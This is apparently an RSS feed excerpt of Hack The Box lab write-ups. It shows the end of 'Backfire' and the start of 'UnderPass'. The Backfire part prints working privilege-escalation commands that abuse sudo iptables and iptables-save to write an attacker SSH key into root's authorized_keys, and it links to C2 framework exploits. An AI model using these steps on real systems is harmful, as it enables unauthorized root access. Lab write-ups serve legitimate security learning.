&lt;/span>&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="hl">&lt;span class="lnt">22
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">23
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Linux&lt;/span> &lt;span class="nx">backfire&lt;/span> &lt;span class="mf">6.1.0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">amd64&lt;/span> &lt;span class="err">#&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">SMP&lt;/span> &lt;span class="nx">PREEMPT_DYNAMIC&lt;/span> &lt;span class="nx">Debian&lt;/span> &lt;span class="mf">6.1.123&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">x86_64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">HardHatC2&lt;/span> &lt;span class="nx">hardhat_firewall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">hardhat_firewall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="p">!&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rules&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">v4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">F&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">localhost&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">localhost&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">sergej&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">backfire&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">use_pty&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">sergej&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">backfire&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nf">iptables&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>We will rely on the following article to escalate our privileges: &lt;a class="link" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank" rel="noopener"
>https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/&lt;/a>&lt;/p>
&lt;p>Here, the preservation of newlines in &lt;code>iptables&lt;/code> comments allows us to write to an arbitrary file using &lt;code>iptables-save&lt;/code>.&lt;/p>
&lt;p>We proceed to overwrite the root authorized_keys file to add our own key allowing us to gain SSH access as &lt;code>root&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 2
&lt;/span>&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="nx">lo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">comment&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">comment&lt;/span> &lt;span class="err">$&amp;#39;\&lt;/span>&lt;span class="nx">nssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ed25519&lt;/span> &lt;span class="nx">AA&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">Dk&lt;/span> &lt;span class="nx">kali&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">FORWARD&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">OUTPUT&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">reject&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">with&lt;/span> &lt;span class="nx">icmp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">unreachable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">reject&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">with&lt;/span> &lt;span class="nx">icmp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">unreachable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="nx">lo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">comment&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">comment&lt;/span> &lt;span class="s">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">ssh-ed25519 AA...Dk kali@kali
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
&lt;/span>&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">a7b&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="mi">74&lt;/span>&lt;span class="nx">e&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="resources">Resources
&lt;/h2>&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener"
>GitHub Repo for the Havoc C2 Framework&lt;/a>&lt;br>
&lt;a class="link" href="https://github.com/sebr-dev/Havoc-C2-SSRF-to-RCE" target="_blank" rel="noopener"
>GitHub Repo for the Havoc C2 SSRF + RCE Exploit&lt;/a>&lt;br>
&lt;a class="link" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7" target="_blank" rel="noopener"
>Medium Article for the HardHat C2 Exploit&lt;/a>&lt;br>
&lt;a class="link" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank" rel="noopener"
>Article Explaining How to Exploit iptables and iptables-save via a sudo Misconfiguration&lt;/a>&lt;/p>&lt;/blockquote></description></item><item><title>UnderPass - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/p/underpass-htb-writeup-linux-easy/</link><pubDate>Sat, 10 May 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/underpass-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/underpass-htb-writeup-linux-easy/UnderPass.PNG" alt="Featured image of post UnderPass - Linux Easy - HTB Writeup" />&lt;h2 id="summary">Summary
&lt;/h2>&lt;p>User: Default credentials and weak password reuse&lt;br>
Root: Sudo Privilege escalation&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>Starting with a simple nmap scan, we can identify that ssh and a web service are exposed.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 4
&lt;/span>&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
&lt;/span>&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.10.11.48&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.9&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.10&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
